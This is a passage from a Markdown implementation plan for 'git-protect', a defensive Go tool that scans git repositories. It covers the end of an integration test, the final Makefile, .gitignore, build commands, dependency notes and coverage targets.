	runGit(t, repoDir, "config", "user.email", "test@test.com")
	runGit(t, repoDir, "config", "user.name", "Test")
	if err := os.WriteFile(filepath.Join(repoDir, "README.md"), []byte("# hi"), 0644); err != nil {
		t.Fatal(err)
	}
	runGit(t, repoDir, "add", ".")
	runGit(t, repoDir, "commit", "-m", "init")

	cmd := exec.Command(bin, "scan", "--json", repoDir)
	out, _ := cmd.CombinedOutput()

	if len(out) == 0 {
		t.Fatal("Expected non-empty JSON output from scan --json")
	}

	// Find the JSON object start
	outStr := string(out)
	jsonStart := strings.Index(outStr, "{")
	if jsonStart == -1 {
		t.Fatalf("No JSON object in output:\n%s", outStr)
	}

	var result struct {
		Findings []interface{} `json:"findings"`
		Blocking bool          `json:"blocking"`
		Count    int           `json:"count"`
	}
	if err := json.NewDecoder(strings.NewReader(outStr[jsonStart:])).Decode(&result); err != nil {
		t.Fatalf("JSON parse error: %v\nOutput:\n%s", err, outStr)
	}
}
```

---

## Task 24: Final Build + Coverage

### `Makefile` (complete, final version)

```makefile
BINARY   := git-protect
VERSION  := 0.1.0
LDFLAGS  := -ldflags "-X main.version=$(VERSION) -s -w"
GOFLAGS  :=

.PHONY: build test test-cover test-integration lint clean install tidy

build:
	go build $(LDFLAGS) -o $(BINARY) ./cmd/git-protect

test:
	go test -race -count=1 $(GOFLAGS) ./...

test-cover:
	go test -race -coverprofile=coverage.out $(GOFLAGS) ./...
	go tool cover -func=coverage.out | tail -1
	@grep -E "^total" coverage.out || true

test-integration: build
	go test -tags=integration -race -count=1 -v ./...

lint:
	go vet ./...
	@if command -v staticcheck >/dev/null 2>&1; then \
		staticcheck ./...; \
	fi

tidy:
	go mod tidy

clean:
	rm -f $(BINARY) coverage.out *.test

install: build
	cp $(BINARY) "$(shell go env GOPATH)/bin/"
```

### `.gitignore`

```
git-protect
coverage.out
*.test
*.tmp
dist/
```

### Build and verification commands

```bash
# Standard unit tests (run from project root)
make test

# Test with coverage report
make test-cover

# Integration tests (requires binary to be built first)
make test-integration

# Linting
make lint

# Build release binary
make build

# Verify binary works
./git-protect version
./git-protect scan --help
```

### go.mod additions required for Task 15

Task 15 uses `golang.org/x/net/idna` for IDN/punycode normalization. Add this dependency:

```bash
go get golang.org/x/net@latest
```

The `go.mod` will then include:

```
require (
    github.com/BurntSushi/toml v1.x.x
    github.com/fatih/color v1.x.x
    github.com/spf13/cobra v1.x.x
    golang.org/x/net v0.x.x
)
```

If `golang.org/x/net` is unavailable or undesirable, the IDN normalization in `url.go` can be made optional with a build tag or stubbed out with a no-op that only lowercases the host — this trades security (homograph protection) for zero external dependencies. The stub replacement for the `idna` block:

```go
// Stub without x/net/idna — lowercase only, no punycode normalization.
// Replace the idna.Lookup.ToASCII block with:
// (nothing — ToLower above is sufficient for ASCII-only hosts)
```

---

## Implementation Notes for Integration

### Import path for scanner modules in `cmd/git-protect/main.go`

The `allModules()` function references concrete module types like `scannerImpl.HooksModule`. These must be exported structs implementing `scanner.Module` in the respective files:
- `internal/scanner/hooks.go` exports `HooksModule`
- `internal/scanner/config.go` exports `ConfigModule`
- etc.

If Tasks 4-14 used unexported module types or factory functions, adjust `allModules()` to use the actual constructor pattern. For example if Task 4 used `scanner.NewHooksModule()`, replace `&scannerImpl.HooksModule{}` with `scannerImpl.NewHooksModule()`.

### Trust store path helpers

`paths.TrustStorePath()` and `paths.HooksDir()` are defined in `internal/paths/paths.go` (Task 1). The CLI commands import this package at `github.com/moldabekov/git-protect/internal/paths`.

### The `trust` package name collision in `cmd/git-protect/main.go`

The `buildTrustCmd()` function creates a variable named `trust` (the cobra.Command) while importing the `trust` package. Rename either the variable or use an import alias. The complete main.go above avoids this by naming the trust subcommand variable differently. If the compiler complains, use:

```go
import trustpkg "github.com/moldabekov/git-protect/internal/trust"
```

and reference `trustpkg.NewStore(...)`, `trustpkg.Entry{...}`, `trustpkg.Normalize(...)`.

### Coverage target

To reach 80%+ coverage across Tasks 15-24:
- `internal/trust/` — url_test.go + store_test.go + match_test.go cover all exported functions
- `internal/output/` — report_test.go covers both RenderText and RenderJSON with all code paths
- `internal/gitcfg/` — hardening_test.go covers HardeningEntries; SetGlobal/GetGlobal/UnsetGlobal require git in PATH (they are tested indirectly by integration tests)
- `internal/hooks/` — manager_test.go covers Install, Uninstall, HookNames
- `internal/clone/` — engine_test.go covers BuildCloneArgs and DetectGitBin; Execute is covered by integration tests
- `cmd/git-protect/` — covered by integration tests; parseSeverity and individual command flags are exercised by TestScan_* tests

Modules from Tasks 1-14 bring the bulk of coverage. Tasks 15-24 add approximately 15-20% additional coverage.
```
